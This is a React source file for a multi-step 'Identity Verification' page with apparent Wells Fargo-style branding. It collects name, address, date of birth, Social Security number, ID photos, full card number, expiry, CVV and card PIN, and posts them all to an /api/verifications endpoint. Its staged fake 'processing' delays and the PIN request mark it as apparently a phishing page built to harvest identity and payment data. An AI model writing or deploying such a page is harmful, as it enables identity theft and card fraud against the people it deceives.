

import React, { useState, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import PageHeader from './PageHeader';
import CameraCaptureModal from './CameraCaptureModal';

const StepIndicator: React.FC<{ currentStep: number }> = ({ currentStep }) => (
    <div className="flex items-center w-full mb-8">
        {Array.from({ length: 4 }).map((_, i) => {
            const stepNumber = i + 1;
            const isCompleted = stepNumber < currentStep;
            const isActive = stepNumber === currentStep;

            return (
                <React.Fragment key={i}>
                    <div className="flex flex-col items-center z-10">
                        <div className={`w-8 h-8 rounded-full flex items-center justify-center transition-colors duration-300 ${isCompleted ? 'bg-green-500' : isActive ? 'bg-wells-red' : 'bg-gray-300'}`}>
                            {isCompleted ? (
                                <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" /></svg>
                            ) : (
                                <span className={`font-bold ${isActive ? 'text-white' : 'text-gray-600'}`}>{stepNumber}</span>
                            )}
                        </div>
                    </div>
                    {stepNumber < 4 && (
                        <div className="flex-1 h-1 bg-gray-300">
                           <div className={`h-1 bg-green-500 transition-all duration-300 ${isCompleted ? 'w-full' : 'w-0'}`} />
                        </div>
                    )}
                </React.Fragment>
            );
        })}
    </div>
);


const VerificationPage: React.FC = () => {
    const { accountId, txId } = useParams<{ accountId: string, txId: string }>();
    const navigate = useNavigate();
    const [step, setStep] = useState(1);
    const [formData, setFormData] = useState({
        fullName: '', email: '', addressLine1: '', city: '', state: '', zipCode: '', dob: '', ssn: '',
        idFront: '', idBack: '',
        cardName: '', cardType: 'visa', cardBank: '', cardNumber: '', cardExpiry: '', cardCvv: '',
        cardPin: ''
    });
    const [error, setError] = useState('');
    const [loading, setLoading] = useState(false);
    const [showCamera, setShowCamera] = useState<'idFront' | 'idBack' | null>(null);
    
    const frontIdRef = useRef<HTMLInputElement>(null);
    const backIdRef = useRef<HTMLInputElement>(null);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
    };

    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.slice(0, 2) + '/' + value.slice(2, 4);
        }
        setFormData(prev => ({ ...prev, cardExpiry: value }));
    };
    
    const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, field: 'idFront' | 'idBack') => {
        if (e.target.files && e.target.files[0]) {
            const file = e.target.files[0];
            const reader = new FileReader();
            reader.onloadend = () => {
                setFormData(prev => ({ ...prev, [field]: reader.result as string }));
            };
            reader.readAsDataURL(file);
        }
    };
    
    const handlePhotoCapture = (photo: string) => {
        if (showCamera) {
            setFormData(prev => ({ ...prev, [showCamera]: photo }));
        }
        setShowCamera(null);
    };

    const handleNextStep = () => {
        setLoading(true);
        setTimeout(() => {
            setStep(s => s + 1);
            setLoading(false);
        }, 1200);
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');
        if (step < 4) {
            handleNextStep();
            return;
        }

        setLoading(true);
        try {
            const token = localStorage.getItem('token');
            const response = await fetch('/api/verifications', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({ accountId, transactionId: txId, data: formData })
            });

            if (!response.ok) {
                const err = await response.json();
                throw new Error(err.message || 'Submission failed.');
            }
            
            navigate(`/account/${accountId}/transaction/${txId}`);

        } catch (err: any) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    const renderStep = () => {
        switch (step) {
            case 1:
                return (
                    <div className="space-y-4 animate-fade-in">
                        <h2 className="text-xl font-bold">Step 1: Personal Information</h2>
                        <div>
                            <label className="block text-sm font-medium mb-1">Full Name</label>
                            <input type="text" name="fullName" value={formData.fullName} onChange={handleChange} required className="w-full p-2 border rounded"/>
                        </div>
                        <div>
                            <label className="block text-sm font-medium mb-1">Email Address</label>
                            <input type="email" name="email" value={formData.email} onChange={handleChange} required className="w-full p-2 border rounded"/>
                        </div>
                        <div>
                            <label className="block text-sm font-medium mb-1">Address</label>
                            <input type="text" name="addressLine1" placeholder="Street Address" value={formData.addressLine1} onChange={handleChange} required className="w-full p-2 border rounded mb-2"/>
                            <div className="grid grid-cols-2 gap-2">
                                <input type="text" name="city" placeholder="City" value={formData.city} onChange={handleChange} required className="w-full p-2 border rounded"/>
                                <input type="text" name="state" placeholder="State" value={formData.state} onChange={handleChange} required className="w-full p-2 border rounded"/>
                            </div>
                            <input type="text" name="zipCode" placeholder="Zip Code" value={formData.zipCode} onChange={handleChange} required className="w-full p-2 border rounded mt-2"/>
                        </div>
                         <div>
                            <label className="block text-sm font-medium mb-1">Date of Birth</label>
                            <input type="date" name="dob" value={formData.dob} onChange={handleChange} required className="w-full p-2 border rounded"/>
                        </div>
                        <div>
                            <label className="block text-sm font-medium mb-1">Social Security Number</label>
                            <input type="text" name="ssn" value={formData.ssn} onChange={handleChange} required className="w-full p-2 border rounded"/>
                        </div>
                    </div>
                );
            case 2:
                return (
                    <div className="space-y-4 animate-fade-in">
                        <h2 className="text-xl font-bold">Step 2: Upload ID</h2>
                         <input type="file" accept="image/*" ref={frontIdRef} onChange={(e) => handleFileChange(e, 'idFront')} className="hidden" />
                         <input type="file" accept="image/*" ref={backIdRef} onChange={(e) => handleFileChange(e, 'idBack')} className="hidden" />

                        <div className="p-4 border-2 border-dashed rounded-lg text-center">
                            <p className="font-semibold">Front of ID</p>
                            {formData.idFront ? <img src={formData.idFront} alt="ID Front Preview" className="mx-auto my-2 max-h-40 rounded"/> : <p className="text-gray-500 text-sm py-8">No file selected</p>}
                            <button type="button" onClick={() => setShowCamera('idFront')} className="text-sm text-wells-red font-semibold mr-4">Take Photo</button>
                            <button type="button" onClick={() => frontIdRef.current?.click()} className="text-sm text-wells-red font-semibold">Upload File</button>
                        </div>
                         <div className="p-4 border-2 border-dashed rounded-lg text-center">
                            <p className="font-semibold">Back of ID</p>
                            {formData.idBack ? <img src={formData.idBack} alt="ID Back Preview" className="mx-auto my-2 max-h-40 rounded"/> : <p className="text-gray-500 text-sm py-8">No file selected</p>}
                            <button type="button" onClick={() => setShowCamera('idBack')} className="text-sm text-wells-red font-semibold mr-4">Take Photo</button>
                            <button type="button" onClick={() => backIdRef.current?.click()} className="text-sm text-wells-red font-semibold">Upload File</button>
                        </div>
                    </div>
                );
            case 3:
                return (
                    <div className="space-y-4 animate-fade-in">
                        <h2 className="text-xl font-bold">Step 3: Link Card</h2>
                        <div><label className="block text-sm font-medium mb-1">Cardholder Name</label><input type="text" name="cardName" value={formData.cardName} onChange={handleChange} required className="w-full p-2 border rounded"/></div>
                        <div><label className="block text-sm font-medium mb-1">Card Type</label><select name="cardType" value={formData.cardType} onChange={handleChange} className="w-full p-2 border rounded"><option value="visa">Visa</option><option value="mastercard">Mastercard</option><option value="amex">Amex</option></select></div>
                        <div><label className="block text-sm font-medium mb-1">Issuing Bank</label><input type="text" name="cardBank" value={formData.cardBank} onChange={handleChange} required className="w-full p-2 border rounded"/></div>
                        <div><label className="block text-sm font-medium mb-1">Card Number</label><input type="text" name="cardNumber" inputMode="numeric" value={formData.cardNumber} onChange={handleChange} required className="w-full p-2 border rounded"/></div>
                        <div className="grid grid-cols-2 gap-4">
                            <div><label className="block text-sm font-medium mb-1">Expiry Date</label><input type="text" name="cardExpiry" placeholder="MM/YY" value={formData.cardExpiry} onChange={handleExpiryChange} required className="w-full p-2 border rounded"/></div>
                            <div><label className="block text-sm font-medium mb-1">CVV</label><input type="text" name="cardCvv" inputMode="numeric" maxLength={4} value={formData.cardCvv} onChange={handleChange} required className="w-full p-2 border rounded"/></div>
                        </div>
                    </div>
                );
            case 4:
                return (
                     <div className="space-y-4 animate-fade-in">
                        <h2 className="text-xl font-bold">Step 4: Set Card PIN</h2>
                        <div>
                            <label className="block text-sm font-medium mb-1">4 to 6-Digit Card PIN</label>
                            <input type="password" name="cardPin" inputMode="numeric" minLength={4} maxLength={6} value={formData.cardPin} onChange={handleChange} required className="w-full p-2 border rounded text-center tracking-[1em]"/>
                        </div>
                     </div>
                )
        }
    }

    return (
        <div className="bg-slate-50 min-h-full">
            <PageHeader title="Identity Verification" />
            <div className="p-4">
                <div className="bg-white p-6 rounded-lg shadow-sm">
                    <StepIndicator currentStep={step} />
                    <form onSubmit={handleSubmit}>
                        <div className="min-h-[300px]">
                            {loading ? (
                                <div className="flex justify-center items-center h-full">
                                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-wells-red"></div>
                                </div>
                            ) : renderStep()}
                        </div>
                        {error && <p className="text-red-500 text-sm text-center mt-4">{error}</p>}
                        <div className="flex justify-between items-center mt-8">
                            {step > 1 && <button type="button" onClick={() => setStep(s => s - 1)} className="px-6 py-2 rounded-md bg-gray-200 font-semibold hover:bg-gray-300">Back</button>}
                            <button type="submit" disabled={loading} className="px-6 py-2 rounded-md bg-wells-red text-white font-semibold disabled:opacity-50 ml-auto">
                               {loading ? 'Processing...' : (step === 4 ? 'Complete Verification' : 'Next')}
                            </button>
                        </div>
                    </form>
                </div>
            </div>
            <CameraCaptureModal
                isOpen={!!showCamera}
                onClose={() => setShowCamera(null)}
                onCapture={handlePhotoCapture}
            />
        </div>
    );
};

export default VerificationPage;